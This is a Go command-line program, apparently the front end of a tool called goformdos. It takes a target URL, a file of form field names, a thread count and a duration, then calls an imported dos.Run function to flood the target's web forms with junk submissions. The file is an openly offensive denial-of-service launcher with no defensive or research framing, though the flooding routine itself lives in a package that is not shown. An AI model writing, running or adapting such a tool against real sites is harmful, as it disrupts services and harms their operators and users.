package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/pierelucas/goformdos/dos"
)

var (
	flagFile = flag.String(
		"f",
		"",
		"File containing form names")
	flagURL = flag.String(
		"u",
		"",
		"Target url")
	flagThreads = flag.Int(
		"r",
		0,
		"Define how many routines should running")
	flagTime = flag.Int(
		"t",
		0,
		"Define dos duration (seconds)")
)

func appendFilelinesToSlice(filename string, ss *[]string, sync chan<- string) {
	f, err := os.Open(filename)
	if err != nil {
		sync <- fmt.Sprintf("error opening file: %s\n", filename)
	}

	defer func() {
		if err = f.Close(); err != nil {
			sync <- fmt.Sprintf("error closing file: %s\n", filename)
		}
	}()

	s := bufio.NewScanner(f)
	var stripped string
	for s.Scan() {
		stripped = strings.Trim(s.Text(), " \r\n") // Strip whitespace, newline and carriage return from string
		*ss = append(*ss, stripped)
	}

	if err = s.Err(); err != nil {
		sync <- fmt.Sprintf("%s\n", err)
	}

	sync <- ""
}

func validateURL(s string, sync chan<- int8) {
	_, err := url.ParseRequestURI(s)
	if err != nil {
		sync <- -1
	}
	sync <- 0
}

func init() {
	flag.Parse()
	if *flagFile == "" || *flagURL == "" || *flagThreads <= 0 || *flagTime <= 0 {
		fmt.Println("please define arguments or use -h for help")
		os.Exit(1)
	}
}

func main() {

	var formSlice []string

	urlsync := make(chan int8)
	appendsync := make(chan string)

	go appendFilelinesToSlice(*flagFile, &formSlice, appendsync)
	go validateURL(*flagURL, urlsync)

	appenderr := <-appendsync
	urlerr := <-urlsync
	if appenderr != "" {
		fmt.Println(appenderr)
		os.Exit(1)
	}
	if urlerr < 0 {
		fmt.Printf("url is invalid: %s\n", *flagURL)
		os.Exit(1)
	}

	var info dos.TargetInf
	info.AddWebaddress(*flagURL)
	for _, element := range formSlice {
		info.AddForm(element, "1234567890AaBb!?-")
	}

	err := dos.Run(*flagThreads, *flagTime, info)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
